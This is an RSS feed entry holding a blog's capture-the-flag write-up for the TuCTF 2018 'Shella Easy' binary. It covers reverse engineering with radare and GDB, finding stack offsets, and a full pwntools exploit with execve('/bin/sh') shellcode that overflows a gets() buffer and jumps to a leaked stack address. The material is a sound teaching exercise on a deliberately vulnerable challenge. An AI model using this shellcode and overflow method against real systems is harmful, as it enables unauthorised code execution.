<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Anubis</title><link>https://anvbis.github.io/posts/</link><description>Recent content in Posts on Anubis</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Wed, 11 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>TuCTF 2018 :: Shella Easy</title><link>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</link><pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</guid><description>Reverse Engineering From the file command we can see that it is a dynamically linked linux executable.
$ file shella-easy shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped Running checksec on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>From the <code>file</code> command we can see that it is a dynamically linked linux executable.</p>
<pre><code>$ file shella-easy
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
</code></pre><p>Running <code>checksec</code> on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</p>
<pre><code>$ checksec ./shella-easy
[*] './shella-easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre><p>This means a few things for us:</p>
<ul>
<li>We know where everything is stored inside the binary.</li>
<li>We can execute arbitrary shellcode on the stack.</li>
<li>A stack overflow can give us control over program execution.</li>
</ul>
<p>Running <code>shella-easy</code> shows that the binary (at some point) takes user input. We&rsquo;ll need to reverse it in order to understand how it does this, but it is a potential avenue for exploitation.</p>
<pre><code>$ ./shella-easy
I'll have a 0xffc40780 with a side of fries thanks
asdfasdf
</code></pre><p>Reversing the <code>main</code> function of the binary reveals that it uses <code>gets</code> to take user input. As we suspected, this is likely where we can exploit this.</p>
<pre><code>0x08048532      83c408         add esp, 8
0x08048535      8d45b8         lea eax, [s]
0x08048538      50             push eax                    ; char *s
0x08048539      e852feffff     call sym.imp.gets           ; char *gets(char *s)
</code></pre><p>Another important thing to note, is that the binary does have some protections in place against stack overflows; if the variable <code>var_8h</code> is not set to <code>0xdeadbeef</code>, the binary will immediately exit (instead of returning and giving us control).</p>
<pre><code>    0x08048541      817df8efbead.  cmp dword [var_8h], 0xdeadbeef
┌─&lt; 0x08048548      7407           je 0x8048551
│   0x0804854a      6a00           push 0                      ; int status
│   0x0804854c      e84ffeffff     call sym.imp.exit           ; void exit(int status)
└─&gt; 0x08048551      b800000000     mov eax, 0
    0x08048556      8b5dfc         mov ebx, dword [var_4h]
    0x08048559      c9             leave
    0x0804855a      c3             ret
</code></pre><p>We can also see that this variable <code>var_8h</code> is initially set to a value of <code>0xcafebabe</code> higher up in the instruction stream.</p>
<pre><code>0x0804851b      c745f8bebafe.  mov dword [var_8h], 0xcafebabe
</code></pre><p>We&rsquo;ll want to find out where <code>var_8h</code> is stored relative to where our input <code>s</code> is stored, so we can overwrite the value of it in order to bypass this check (when we perform our overflow).</p>
<p>Radare tells us a little about where these variables are supposed to be stored (in the <code>main</code> function header), but we&rsquo;ll want to verify this later.</p>
<pre><code>; var char *s @ ebp-0x48
; var uint32_t var_8h @ ebp-0x8
; var int32_t var_4h @ ebp-0x4
</code></pre><p>We can see that the <code>var_8h</code> is stored below our input buffer <code>s</code> on the stack, this is good for us as we can overwrite its value when we perform our overflow.</p>
<p>A quick calculation <code>0x48 - 0x8 = 0x40 = 64</code> tells us that <code>var_8h</code> is stored 64 bytes after the start of our input buffer.</p>
<h2 id="information-gathering">Information Gathering</h2>
<p>First, let&rsquo;s spin up GDB and verify the location of <code>var_8h</code> relative to our input buffer <code>s</code>.</p>
<p>We&rsquo;ll set a breakpoint just after the <code>gets</code> call so we can see what the stack looks like just after we&rsquo;ve provided the binary with input.</p>
<pre><code>pwndbg&gt; disassemble main
Dump of assembler code for function main:

...

   0x08048539 &lt;+94&gt;:    call   0x8048390 &lt;gets@plt&gt;
   0x0804853e &lt;+99&gt;:    add    esp,0x4
   0x08048541 &lt;+102&gt;:   cmp    DWORD PTR [ebp-0x8],0xdeadbeef
   0x08048548 &lt;+109&gt;:   je     0x8048551 &lt;main+118&gt;
   0x0804854a &lt;+111&gt;:   push   0x0
   0x0804854c &lt;+113&gt;:   call   0x80483a0 &lt;exit@plt&gt;
   0x08048551 &lt;+118&gt;:   mov    eax,0x0
   0x08048556 &lt;+123&gt;:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048559 &lt;+126&gt;:   leave  
   0x0804855a &lt;+127&gt;:   ret    

...

pwndbg&gt; b *0x0804853e
Breakpoint 1 at 0x804853e
</code></pre><p>We can now run the binary inside GDB and we&rsquo;ll give it the value <code>AAAA</code> when it prompts us for input, so we can easily see where our input is stored inside the stack.</p>
<pre><code>pwndbg&gt; r
Starting program: /home/stephen/Projects/nightmare/modules/06-bof_shellcode/tu18_shellaeasy/shella-easy 
Yeah I'll have a 0xffffcff0 with a side of fries thanks
AAAA

Breakpoint 1, 0x0804853e in main ()

...
</code></pre><p>After dumping the relevant part of the stack, we can verify the location of <code>var_8h</code> relative to <code>s</code> with a simple calculation; <code>0xffffd030 - 0xffffcff0 = 64</code>.</p>
<pre><code>pwndbg&gt; x/20x $ebp-0x48
0xffffcff0:     0x41414141      0xf7fe3200      0x00000000      0xf7e02c1e
0xffffd000:     0xf7fb03fc      0xffffffff      0x00000000      0x080485ab
0xffffd010:     0x00000001      0xffffd0e4      0xffffd0ec      0x08048581
0xffffd020:     0xf7fe3230      0x00000000      0x08048569      0x00000000
0xffffd030:     0xcafebabe      0x00000000      0x00000000      0xf7de9e46
</code></pre><p>While we&rsquo;re at this breakpoint, we can also take a look at what the binary is leaking. Yep, it&rsquo;s definitely the location of our input buffer on the stack, this will make the exploitation process a lot easier.</p>
<pre><code>pwndbg&gt; x/x 0xffffcff0
0xffffcff0:     0x41414141
</code></pre><p>Now let&rsquo;s find the location of the function&rsquo;s return address stored on the stack relative to our input buffer.</p>
<p>We can write a quick script using pwntools that sends a cyclic pattern of bytes (with the <code>var_8h</code> variable overwritten with <code>0xdeadbeef</code>) that we can use to determine the location of the return address.</p>
<pre><code>#!/usr/bin/env python3

from pwn import *


pad = b'A'*64
var = p32(0xdeadbeef)

r = process('./shella-easy')
gdb.debug(r)

r.writeline(pad + var + cyclic(64))
r.interactive()
</code></pre><p>We know that the program should crash once we&rsquo;ve overwritten the return address with our bad data. So printing the value of <code>$eip</code> after the crash should give us the bytes that the return address was overwritten with.</p>
<pre><code>pwndbg&gt; p $eip
$1 = (void (*)()) 0x61616163
</code></pre><p>We can use pwntools' <code>cyclic_find</code> function and the bytes contained within <code>eip</code> above, in order to find the offset of the return address from the end of our payload.</p>
<pre><code>In [2]: cyclic_find(0x61616163)
Out[2]: 8
</code></pre><h2 id="exploit-development">Exploit Development</h2>
<p>Now that we know the location of <code>var_8h</code> and the return address relative to our input buffer we can begin to craft our exploit.</p>
<p>We know that we can execute arbitrary code within the stack, so let&rsquo;s write up some quick shellcode to give us an interactive shell.</p>
<pre><code>.global _start

_start:
.intel_syntax noprefix
shell:
    push 0x0068732f     # &quot;/sh&quot;
    push 0x6e69622f     # &quot;/bin&quot;
    mov ebx, esp        # &quot;/bin/sh&quot;
    mov ecx, 0
    mov edx, 0
    mov eax, 11
    int 0x80            # execve(&quot;/bin/sh&quot;, 0, 0)
exit:
    mov ebx, 0          # exit code
    mov eax, 0
    int 0x80            # exit(0)
</code></pre><p>Let&rsquo;s compile our shellcode, and get a representation of it that we can use in our exploit code.</p>
<pre><code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
</code></pre><pre><code>In [1]: open('payload','rb').read()
Out[1]: b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'
</code></pre><p>Now we can build our exploit. Here is an outline of what we want to achieve:</p>
<ul>
<li>Capture the leaked stack address.</li>
<li>Overwrite <code>var_8h</code> with <code>0xdeadbeef</code>.</li>
<li>Overwrite the return address using the leak.</li>
<li>Get code execution.</li>
</ul>
<pre><code>#!/usr/bin/env python3

from pwn import *


buf = b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'

pad = b'A'*(64 - len(buf))
var = p32(0xdeadbeef)
off = b'A'*8

r = process('./shella-easy')
#gdb.attach(r)

# capture the leaked stack address
r.readuntil('Yeah I\'ll have a ')
leak = p32(eval(r.read(10)))
r.clean()

# send our payload to the binary
r.writeline(buf + pad + var + off + leak)
r.interactive()
</code></pre><p>And finally, here&rsquo;s the exploit in action.</p>
<pre><code>./exploit.py 
[+] Starting local process './shella-easy': pid 3768
[*] Switching to interactive mode
$ cat flag.txt
TuCTF{Shella Easy}
</code></pre>]]></content></item></channel></rss>